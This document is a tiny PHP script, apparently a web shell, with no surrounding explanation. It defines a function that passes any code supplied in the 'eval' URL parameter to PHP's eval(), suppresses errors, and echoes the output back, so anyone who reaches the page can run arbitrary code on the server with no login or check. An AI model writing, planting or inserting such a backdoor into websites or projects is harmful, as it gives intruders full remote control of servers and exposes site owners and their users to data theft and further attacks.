<?php
function xeval($code){
	@ob_start();
	@eval($code);
	$buff = @ob_get_contents();
	return $buff;
}

if(isset($_GET['eval']))
	echo xeval($_GET['eval']);
?>